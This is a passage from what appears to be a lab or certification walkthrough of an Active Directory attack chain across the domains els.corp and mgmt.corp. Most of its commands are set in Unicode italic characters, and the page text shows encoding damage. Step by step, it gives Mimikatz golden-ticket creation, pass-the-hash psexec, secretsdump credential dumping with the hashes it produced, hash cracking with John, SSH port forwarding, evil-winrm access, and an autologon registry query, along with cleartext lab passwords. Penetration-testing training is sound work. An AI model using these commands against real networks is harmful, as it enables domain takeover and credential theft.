ğŸğŸğŸğŸ•ğ’‡ğŸ‘ğŸ–ğ’‡ğŸ–ğŸ—ğŸ•ğ’ƒğŸğŸ’ğŸ‘ğŸ–ğ’†ğŸ’ğŸ—ğŸ‘ğ’†ğŸğ’†ğ’†ğŸ“ğŸ–ğ’…ğ’ƒğŸ—ğŸ–ğ’„ğŸ
</Result>
See below the extracted NTLM Hash of 'krbtgt' from the child domain controller. The SID of the child domain can be extracted from the result (without RID part).



<p>To enumerate the parent SID value, we can use the Active Directory module already present at the domain controller.</p>
<p>In the psexec session, switch to Power Shell:<br>ğ‘ğ‘œğ‘¤ğ‘’ğ‘Ÿğ‘ â„ğ‘’ğ‘™ğ‘™<br>ğ¼ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡âˆ’ğ‘€ğ‘œğ‘‘ğ‘¢ğ‘™ğ‘’ ğ´ğ‘ğ‘¡ğ‘–ğ‘£ğ‘’ğ·ğ‘–ğ‘Ÿğ‘’ğ‘ğ‘¡ğ‘œğ‘Ÿğ‘¦</p>
<p>Enumerate Domains present in the Forest (most importantly SID value of parent domain):<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ·ğ‘œğ‘šğ‘ğ‘–ğ‘›<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ¹ğ‘œğ‘Ÿğ‘’ğ‘ ğ‘¡<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ·ğ‘œğ‘šğ‘ğ‘–ğ‘› ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘ (ğ‘“ğ‘œğ‘Ÿ ğ‘ ğ‘–ğ‘‘ ğ‘œğ‘“ ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘)<br>SID of Parent Domain Controller [els.corp] discovered:</p>
<p>We have collected all the info needed to perform a golden ticket attack and cross the domain boundary. Letâ€™s use Mimikatz.exe functionality to create and pass a golden ticket.</p>
<p>Create &amp; Pass Golden Ticket:<br>ğ‘˜ğ‘’ğ‘Ÿğ‘ğ‘’ğ‘Ÿğ‘œğ‘ ::ğ‘”ğ‘œğ‘™ğ‘‘ğ‘’ğ‘› /ğ‘¢ğ‘ ğ‘’ğ‘Ÿ:ğ‘’ğ‘™ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› /ğ‘‘ğ‘œğ‘šğ‘ğ‘–ğ‘›:ğ‘’ğ‘™ğ‘ âˆ’ğ‘â„ğ‘–ğ‘™ğ‘‘.ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘ /ğ‘ ğ‘–ğ‘‘:ğ‘†âˆ’1âˆ’5âˆ’21âˆ’3883140795âˆ’789752816âˆ’1587902789 /ğ‘˜ğ‘Ÿğ‘ğ‘¡ğ‘”ğ‘¡:ğŸğŸğŸğŸ•ğ’‡ğŸ‘ğŸ–ğ’‡ğŸ–ğŸ—ğŸ•ğ’ƒğŸğŸ’ğŸ‘ğŸ–ğ’†ğŸ’ğŸ—ğŸ‘ğ’†ğŸğ’†ğ’†ğŸ“ğŸ–ğ’…ğ’ƒğŸ—ğŸ–ğ’„ğŸ /ğ‘ ğ‘–ğ‘‘ğ‘ :ğ‘†âˆ’1âˆ’5âˆ’21âˆ’286056459âˆ’1157968049âˆ’2884264478âˆ’519 /ğ‘¡ğ‘–ğ‘ğ‘˜ğ‘’ğ‘¡:ğ‘¡ğ‘–ğ‘ğ‘˜ğ‘’ğ‘¡.ğ‘˜ğ‘–ğ‘Ÿğ‘ğ‘–</p>
<p>ğ‘˜ğ‘’ğ‘Ÿğ‘ğ‘’ğ‘Ÿğ‘œğ‘ ::ğ‘ğ‘¡ğ‘¡ ğ‘¡ğ‘–ğ‘ğ‘˜ğ‘’ğ‘¡.ğ‘˜ğ‘–ğ‘Ÿğ‘ğ‘–<br>Golden Ticket:</p>
<p>Passing the ticket in active Kerberos session:</p>
<p>To check if the ticket is successfully passed or not, one can always use the â€˜klistâ€™ command. Now, we can access resources of the parent domain and request any service ticket.</p>
<p>We will also extract the NTLM hash of the Enterprise Administrator of â€œels.corpâ€ domain (found previously during enumeration activities) using mimikatz.exe</p>
<p>ELS-DC Server<br>With the credentials of â€œels-adminâ€ enterprise admin, we can perform psexec on the parent DC server.</p>
<p>Perform psexec on ELS-DC server:<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ğ‘ ğ‘’ğ‘¥ğ‘’ğ‘.ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.1.3 ğ‘’ğ‘™ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›@ğ¸ğ¿ğ‘†âˆ’ğ·ğ¶ âˆ’â„ğ‘ğ‘ â„ğ‘’ğ‘  ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:8645ğ‘’87ğ‘’2593507ğ‘ğ‘“623ğ‘“3291ğ‘1334ğ‘2<br>â€œNT Authority\Systemâ€ at â€œELS-DCâ€ parent domain controller.</p>
<p>Letâ€™s now use the Active-Directory module to perform some enumeration (for abusing a cross-forest trust later on). Switch to PowerShell and load the AD module to enumerate a forest trust.</p>
<p>Load AD module &amp; perform trust enumeration</p>
<p>ğ¼ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡âˆ’ğ‘€ğ‘œğ‘‘ğ‘¢ğ‘™ğ‘’ ğ´ğ‘ğ‘¡ğ‘–ğ‘£ğ‘’ğ·ğ‘–ğ‘Ÿğ‘’ğ‘ğ‘¡ğ‘œğ‘Ÿğ‘¦<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘‡ğ‘Ÿğ‘¢ğ‘ ğ‘¡ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ—<br>Output of trust established by the â€œels.corpâ€ domain.</p>
<p>Another domain â€œmgmt.corpâ€ having a bi-directional trust has been identified in the above result. A Foreign Security Principal can indirectly be used to abuse the cross-forest trust. Letâ€™s enumerate FSPâ€™s available on the identified domain â€œmgmt.corpâ€.</p>
<p>Enumerate FSPs on mgmt.corp domain<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ {ğ‘œğ‘ğ‘—ğ‘’ğ‘ğ‘¡ğ¶ğ‘™ğ‘ğ‘ ğ‘  âˆ’ğ‘’ğ‘ â€œğ‘“ğ‘œğ‘Ÿğ‘’ğ‘–ğ‘”ğ‘›ğ‘†ğ‘’ğ‘ğ‘¢ğ‘Ÿğ‘–ğ‘¡ğ‘¦ğ‘ƒğ‘Ÿğ‘–ğ‘›ğ‘ğ‘–ğ‘ğ‘ğ‘™â€} âˆ’ğ‘ ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ ğ‘šğ‘”ğ‘šğ‘¡.ğ‘ğ‘œğ‘Ÿğ‘<br>A Foreign Security Principal is available on the â€œmgmt.corpâ€ domain, this means a user in the current domain â€œels.corpâ€ is present in the target â€œmgmt.corpâ€ domain:</p>
<p>Convert the identified user to SID:</p>
<p>Identify User:<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘ˆğ‘ ğ‘’ğ‘Ÿ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ— |?{$_.ğ‘†ğ¼ğ· âˆ’ğ‘’ğ‘ â€²ğ‘†âˆ’1âˆ’5âˆ’21âˆ’286056459âˆ’1157968049âˆ’2884264478âˆ’1107â€²}<br>The foreign user can be identified as â€œforest_userâ€ of the els.corp domain:</p>
<p>We need to identify the privileges of â€œforest_userâ€ in the mgmt.corp domain.</p>
<p>Identify on which group â€˜forest_userâ€™ is added at mgmt.corp domain:<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğºğ‘Ÿğ‘œğ‘¢ğ‘ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ— âˆ’ğ‘ƒğ‘Ÿğ‘œğ‘ğ‘’ğ‘Ÿğ‘¡ğ‘–ğ‘’ğ‘  ğ‘€ğ‘’ğ‘šğ‘ğ‘’ğ‘Ÿ âˆ’ğ‘ ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿ ğ‘šğ‘”ğ‘šğ‘¡.ğ‘ğ‘œğ‘Ÿğ‘ |?{$_.ğ‘€ğ‘’ğ‘šğ‘ğ‘’ğ‘Ÿ âˆ’ğ‘šğ‘ğ‘¡ğ‘â„ â€²ğ‘†âˆ’1âˆ’5âˆ’21âˆ’3658202825âˆ’2428483480âˆ’107650130âˆ’1107â€²}<br>It comes out that â€˜forest_userâ€™ is added to local administrators of the â€˜mgmt.corpâ€™ domain.</p>
<p>Now, we need to extract the credentials of â€˜forest_userâ€™ and then we will perform PTH to the â€œmgmt.corpâ€ domain.</p>
<p>Run secretsdump against mgmt.corp domain:<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ ğ‘’ğ‘ğ‘Ÿğ‘’ğ‘¡ğ‘ ğ‘‘ğ‘¢ğ‘šğ‘.ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.1.3 ğ‘’ğ‘™ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›@ğ¸ğ¿ğ‘†âˆ’ğ·ğ¶ âˆ’â„ğ‘ğ‘ â„ğ‘’ğ‘  ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:8645ğ‘’87ğ‘’2593507ğ‘ğ‘“623ğ‘“3291ğ‘1334ğ‘2</p>
<Result>
ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘\ğ‘“ğ‘œğ‘Ÿğ‘’ğ‘ ğ‘¡_ğ‘¢ğ‘ ğ‘’ğ‘Ÿ:1107:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:ğ‘7001ğ‘2ğ‘‘ğ‘ğ‘’0ğ‘“ğ‘ğ‘‘ğ‘ğ‘‘62ğ‘’ğ‘’4ğ‘3ğ‘ğ‘‘ğ‘’2410ğ‘9
</Result>


<p>Credentials of â€œforest_userâ€ are extracted as follows:</p>
<p>We will now perform psexec against the â€˜mgmt-DCâ€™ server. The IP address of mgmt.corp domain can be enumerated using a simple DNS query (i.e nslookup mgmt.corp).</p>
<p>MGMT-DC Server<br>Using â€œforest_userâ€ we can establish a persistent connection using impacketâ€™s psexec script since it is a member of local administrators in the mgmt.corp domain.</p>
<p>Psexec as â€˜forest_userâ€™ on â€˜mgmt.corpâ€™ domain:<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ğ‘ ğ‘’ğ‘¥ğ‘’ğ‘.ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.3.2 ğ‘“ğ‘œğ‘Ÿğ‘’ğ‘ ğ‘¡_ğ‘¢ğ‘ ğ‘’ğ‘Ÿ@ğ‘€ğºğ‘€ğ‘‡âˆ’ğ·ğ¶ âˆ’â„ğ‘ğ‘ â„ğ‘’ğ‘  ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:ğ‘7001ğ‘2ğ‘‘ğ‘ğ‘’0ğ‘“ğ‘ğ‘‘ğ‘ğ‘‘62ğ‘’ğ‘’4ğ‘3ğ‘ğ‘‘ğ‘’2410ğ‘9</p>
<p>Switch to PowerShell<br>You will see something similar to the below.</p>
<p>We will also use the Active Directory Module present in the server to list any OU present in the MGMT-DC and all the members present in the available OUâ€™s.</p>
<p>LIST all OUâ€™s in MGMT.CORP<br>ğ¼ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡âˆ’ğ‘€ğ‘œğ‘‘ğ‘¢ğ‘™ğ‘’ ğ´ğ‘ğ‘¡ğ‘–ğ‘£ğ‘’ğ·ğ‘–ğ‘Ÿğ‘’ğ‘ğ‘¡ğ‘œğ‘Ÿğ‘¦<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ {ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ğ¶ğ‘™ğ‘ğ‘ ğ‘  âˆ’ğ‘’ğ‘ â€˜ğ‘œğ‘Ÿğ‘”ğ‘ğ‘›ğ‘–ğ‘§ğ‘ğ‘¡ğ‘–ğ‘œğ‘›ğ‘ğ‘™ğ‘¢ğ‘›ğ‘–ğ‘¡â€™} âˆ’ğ‘ƒğ‘Ÿğ‘œğ‘ğ‘’ğ‘Ÿğ‘¡ğ‘–ğ‘’ğ‘  ğ¶ğ‘ğ‘›ğ‘œğ‘›ğ‘–ğ‘ğ‘ğ‘™ğ‘ğ‘ğ‘šğ‘’ | ğ‘†ğ‘’ğ‘™ğ‘’ğ‘ğ‘¡âˆ’ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ ğ·ğ‘–ğ‘ ğ‘¡ğ‘–ğ‘›ğ‘”ğ‘¢ğ‘–ğ‘ â„ğ‘’ğ‘‘ğ‘ğ‘ğ‘šğ‘’</p>
<p>Get Members of â€œBastion-Hostâ€ OU<br>$ğ‘œğ‘¢ğ‘ğ‘ğ‘¡â„ = â€œğ‘‚ğ‘ˆ=ğµğ‘ğ‘ ğ‘¡ğ‘–ğ‘œğ‘›âˆ’ğ»ğ‘œğ‘ ğ‘¡,ğ·ğ¶=ğ‘šğ‘”ğ‘šğ‘¡,ğ·ğ¶=ğ‘ğ‘œğ‘Ÿğ‘â€<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘ˆğ‘ ğ‘’ğ‘Ÿ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ— âˆ’ğ‘†ğ‘’ğ‘ğ‘Ÿğ‘â„ğµğ‘ğ‘ ğ‘’ $ğ‘œğ‘¢ğ‘ğ‘ğ‘¡â„<br>(ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› ğ‘¢ğ‘ ğ‘’ğ‘Ÿ ğ‘‘ğ‘–ğ‘ ğ‘ğ‘œğ‘£ğ‘’ğ‘Ÿğ‘’ğ‘‘ )<br>The Domain user â€œJump-Adminâ€ present in the â€œBastion-Hostâ€ OU can be useful in moving forward from the MGMT-DC server. The IP address of â€œjump-srvâ€ server can be enumerated by actively querying the DNS record.</p>
<p>ğ‘›ğ‘ ğ‘™ğ‘œğ‘œğ‘˜ğ‘¢ğ‘ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ ğ‘Ÿğ‘£</p>
<p>&lt;..SNIP..&gt;<br>Name: jump-srv.mgmt.corp<br>IP Address: 10.10.3.3<br>&lt;../SNIP..&gt;<br>However, we will extract all the credentials present in the MGMT.CORP domain leveraging impacketâ€™s sercretsdump.py script.</p>
<p>On a new bash prompt using our route to internal network [10.10.3.0/24], we will execute secretsdump.py as follows:</p>
<p>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ ğ‘’ğ‘ğ‘Ÿğ‘’ğ‘¡ğ‘ ğ‘‘ğ‘¢ğ‘šğ‘. ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.3.2 ğ‘ ğ‘ğ‘›_ğ‘ ğ‘£ğ‘@ğ‘€ğºğ‘€ğ‘‡âˆ’ğ·ğ¶.ğ‘€ğºğ‘€ğ‘‡.ğ¶ğ‘‚ğ‘…ğ‘ƒ</p>
<p>[..SNIP..]<br>ğ’ğ’ˆğ’ğ’•âˆ’ğ’‚ğ’…ğ’ğ’Šğ’:500:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:86ğ‘64ğ‘256ğ‘’8ğ‘ğ‘’ğ‘2ğ‘’ğ‘‘ğ‘“31ğ‘4157ğ‘ğ‘“6ğ‘ğ‘’ğ‘ğ‘:::<br>ğ’Œğ’“ğ’ƒğ’•ğ’ˆğ’•:502:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:2ğ‘7ğ‘0ğ‘“537983ğ‘ğ‘ğ‘4120725ğ‘‘055ğ‘“ğ‘ğ‘ğ‘ğ‘9:::<br>ğ’ğ’ˆğ’ğ’•.ğ’„ğ’ğ’“ğ’‘\ğ’‹ğ’–ğ’ğ’‘âˆ’ğ’‚ğ’…ğ’ğ’Šğ’:1104:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:ğŸğ’…ğ’„ğŸ—ğ’ƒğ’‡ğ’‡ğŸ‘ğŸ—ğŸ•ğ’‡ğŸ—ğ’†ğŸ”ğ’„ğŸ—ğ’‡ğŸğŸ–ğ’‚ğŸğŸ“ğ’ƒğŸğŸ–ğŸğŸ’ğŸ“ğ’‚ğŸ•ğ’ƒğŸ”:::<br>ğ’ğ’ˆğ’ğ’•.ğ’„ğ’ğ’“ğ’‘\ğ’”ğ’‘ğ’_ğ’”ğ’—ğ’„:1106:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:2ğ‘‘ğ‘9ğ‘ğ‘“ğ‘“397ğ‘“9ğ‘’6ğ‘9ğ‘“08ğ‘05ğ‘18145ğ‘7ğ‘6:::<br>[..SNIP..]<br>Crack the â€œjump-adminâ€ hash using JTR [John] by storing the NT hash in a file.</p>
<p>â†’ Crack jump-admin hash(2dc9bff397f9e6c9f08a05b18145a7b6):</p>
<p>Copy the hash â€œ2dc9bff397f9e6c9f08a05b18145a7b6â€ in jump-adminpass.txt file</p>
<p>ğ‘—ğ‘œâ„ğ‘› âˆ’âˆ’ğ‘“ğ‘œğ‘Ÿğ‘šğ‘ğ‘¡=ğ‘ğ‘‡ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›ğ‘ğ‘ğ‘ ğ‘ .ğ‘¡ğ‘¥ğ‘¡ âˆ’ğ‘¤=/ğ‘¢ğ‘ ğ‘Ÿ/ğ‘ â„ğ‘ğ‘Ÿğ‘’/ğ‘¤ğ‘œğ‘Ÿğ‘‘ğ‘™ğ‘–ğ‘ ğ‘¡ğ‘ /ğ‘Ÿğ‘œğ‘ğ‘˜ğ‘¦ğ‘œğ‘¢.ğ‘¡ğ‘¥ğ‘¡<br>The hash is cracked and we now have clear text credentials of the â€œjump-adminâ€ user at the â€œJump-Adminâ€ machine.</p>
<p>Jump-Srv<br>Letâ€™s perform a TCP port scan against the target 10.10.3.3 [jump-srv.mgmt.corp] using nmap and leveraging the route to the 10.10.3.0/24 network.</p>
<p>With meterpreter active route to â€œ10.10.3.0/24â€ network &amp; on new bash shell<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘›ğ‘šğ‘ğ‘ âˆ’âˆ’ğ‘¡ğ‘œğ‘âˆ’ğ‘ğ‘œğ‘Ÿğ‘¡ğ‘  10 âˆ’ğ‘ ğ‘‡ âˆ’ğ‘ ğ‘‰ âˆ’ğ‘ƒğ‘› 10.10.3.3</p>
<p>&lt;..SNIP..&gt;<br>ğ‘ğ‘šğ‘ğ‘ ğ‘ ğ‘ğ‘ğ‘› ğ‘Ÿğ‘’ğ‘ğ‘œğ‘Ÿğ‘¡ ğ‘“ğ‘œğ‘Ÿ 10.10.3.3<br>ğ»ğ‘œğ‘ ğ‘¡ ğ‘–ğ‘  ğ‘¢ğ‘ (2.4ğ‘  ğ‘™ğ‘ğ‘¡ğ‘’ğ‘›ğ‘ğ‘¦).<br>ğ‘ƒğ‘‚ğ‘…ğ‘‡ ğ‘†ğ‘‡ğ´ğ‘‡ğ¸ ğ‘†ğ¸ğ‘…ğ‘‰ğ¼ğ¶ğ¸ ğ‘‰ğ¸ğ‘…ğ‘†ğ¼ğ‘‚ğ‘<br>21/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘“ğ‘¡ğ‘<br>ğŸğŸ/ğ’•ğ’„ğ’‘ ğ’ğ’‘ğ’†ğ’ ğ’”ğ’”ğ’‰ ğ‘¶ğ’‘ğ’†ğ’ğ‘ºğ‘ºğ‘¯ ğŸ•.ğŸğ’‘ğŸ ğ‘¼ğ’ƒğ’–ğ’ğ’•ğ’– ğŸ’ğ’–ğ’ƒğ’–ğ’ğ’•ğ’–ğŸ.ğŸ– (ğ‘¼ğ’ƒğ’–ğ’ğ’•ğ’– ğ‘³ğ’Šğ’ğ’–ğ’™;ğ’‘ğ’“ğ’ğ’•ğ’ğ’„ğ’ğ’ ğŸ.ğŸ)<br>23/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘¡ğ‘’ğ‘™ğ‘›ğ‘’ğ‘¡<br>25/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘ ğ‘šğ‘¡ğ‘<br>80/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ â„ğ‘¡ğ‘¡ğ‘<br>110/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘ğ‘œğ‘3<br>&lt;..SNIP..&gt;<br>SSH server is running on TCP port 22. As â€˜jump-srv.mgmt.corpâ€™ machine is managed by â€œjump-adminâ€, we can try to do SSH to â€˜10.10.3.3â€™ machine using Jump-Admin Domain user.</p>
<p>Perform SSH to 10.10.3.3 as jump-admin domain user.</p>
<p>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ ğ‘ â„ âˆ’ğ‘™ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›@ğ‘€ğºğ‘€ğ‘‡.ğ¶ğ‘‚ğ‘…ğ‘ƒ 10.10.3.3<br>NOTE: enter jump-admin cracked password â€˜B@DB!tchâ€™<br>We successfully SSHed to Jump-SRV.mgmt.corp as the â€œjump-adminâ€ domain user.</p>
<p>Letâ€™s also extract the bookmark URLs of Firefox in this machine and look if any interesting information can</p>
<p>be found (as jump-admin user).</p>
<p>As â€˜Jump-adminâ€™ domain user<br>ğ‘ğ‘‘ /.ğ‘šğ‘œğ‘§ğ‘–ğ‘™ğ‘™ğ‘/ğ‘“ğ‘–ğ‘Ÿğ‘’ğ‘“ğ‘œğ‘¥/2ğ‘ 3ğ‘6ğ‘š1ğ‘£.ğ‘‘ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡âˆ’ğ‘Ÿğ‘’ğ‘™ğ‘’ğ‘ğ‘ ğ‘’<br>ğ‘ ğ‘ğ‘™ğ‘–ğ‘¡ğ‘’3 ğ‘ğ‘™ğ‘ğ‘ğ‘’ğ‘ .ğ‘ ğ‘ğ‘™ğ‘–ğ‘¡ğ‘’</p>
<p>Inside SQLite<br>.ğ‘¡ğ‘ğ‘ğ‘™ğ‘’ğ‘ <br>ğ‘ ğ‘’ğ‘™ğ‘’ğ‘ğ‘¡ ğ‘šğ‘œğ‘§_ğ‘ğ‘™ğ‘ğ‘ğ‘’ğ‘ .ğ‘¢ğ‘Ÿğ‘™ ğ‘“ğ‘Ÿğ‘œğ‘š ğ‘šğ‘œğ‘§_ğ‘ğ‘™ğ‘ğ‘ğ‘’ğ‘ ;<br>.ğ‘ğ‘¢ğ‘–ğ‘¡</p>
<p>ğ‘“ğ‘œğ‘¢ğ‘›ğ‘‘ ğ‘ˆğ‘…ğ¿: ğ’‰ğ’•ğ’•ğ’‘ğ’”://ğ’‚ğ’…ğ’ğ’Šğ’âˆ’ğ’”ğ’šğ’”.ğ’”ğ’Šğ’•ğ’†/ğ’ğ’ğ’ˆğ’Šğ’.ğ’‚ğ’”ğ’‘?ğ’–ğ’”ğ’†ğ’“=ğ’”ğ’šğ’”âˆ’ğ’‚ğ’…ğ’ğ’Šğ’&amp;ğ’‘ğ’‚ğ’”ğ’”=ğ‘¹ğ’‚ğ’ğ’…ğŸğ’ğ’ğ’šğ‘ºğŸ‘ğ’ğŸ‘ğ’„ğ’•ğ’†ğ’…ğ‘·@ğ’”ğ’”<br>However, using firefox with proxychains querying the login URL, shows that it is non-existent, Now enumerate the IP address of admin-sys server by pinging the URL.</p>
<p>ğ‘ğ‘–ğ‘›ğ‘” ğ‘ğ‘‘ğ‘šğ‘–ğ‘›âˆ’ğ‘ ğ‘¦ğ‘ .ğ‘ ğ‘–ğ‘¡ğ‘’<br>Discovered IP address [192.168.1.2]<br>Performing TCP port scan on the target â€œ192.168.1.2â€ reveals that the 5985 port is open, which means one can always do PowerShell Remoting.</p>
<p>Admin-SYS<br>In order to perform PowerShell Remoting, we need to apply some port forwarding techniques.</p>
<p>Exit the SSH session and re-establish a new session with port forwarding switches.</p>
<p>Using port forwarding, we are specifying that all the traffic sent locally will be forwarded to the â€˜admin-sysâ€™ server [192.168.1.2]</p>
<p>On a new bash session<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ ğ‘ â„ âˆ’ğ‘™ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›@ğ‘€ğºğ‘€ğ‘‡.ğ¶ğ‘‚ğ‘…ğ‘ƒ 10.10.3.3 âˆ’ğ¿ 5985:192.168.1.2:5985<br>(Now at this very particular point, traffic from your attacker machine can reach the admin-sys machine)</p>
<p>Use Evil-WinRM to connect to 192.168.1.2 machine with the discovered credentials<br>./ğ‘’ğ‘£ğ‘–ğ‘™âˆ’ğ‘¤ğ‘–ğ‘›ğ‘Ÿğ‘š.ğ‘Ÿğ‘ âˆ’ğ‘– 127.0.0.1 âˆ’ğ‘¢ ğ‘ ğ‘¦ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› âˆ’ğ‘ ğ‘…ğ‘ğ‘›ğ‘‘0ğ‘šğ‘™ğ‘¦ğ‘†3ğ‘™3ğ‘ğ‘¡ğ‘’ğ‘‘ğ‘ƒ@ğ‘ ğ‘ <br>Enumerating the environment reveals that â€œsys-adminâ€ is a local user at the admin-sys server. Privilege escalation can be done by querying the autologin registry.</p>
<p>Clear Text credentials of Administrator are found.</p>
<p>On the recently established WinRM session<br>ğ‘Ÿğ‘’ğ‘” ğ‘ğ‘¢ğ‘’ğ‘Ÿğ‘¦ â€œğ»ğ¾ğ¿ğ‘€\ğ‘†ğ‘‚ğ¹ğ‘‡ğ‘Šğ´ğ‘…ğ¸\ğ‘€ğ‘–ğ‘ğ‘Ÿğ‘œğ‘ ğ‘œğ‘“ğ‘¡\ğ‘Šğ‘–ğ‘›ğ‘‘ğ‘œğ‘¤ğ‘  ğ‘ğ‘‡\ğ¶ğ‘¢ğ‘Ÿğ‘Ÿğ‘’ğ‘›ğ‘¡ğ‘£ğ‘’ğ‘Ÿğ‘ ğ‘–ğ‘œğ‘›\ğ‘Šğ‘–ğ‘›ğ‘™ğ‘œğ‘”ğ‘œğ‘›â€</p>
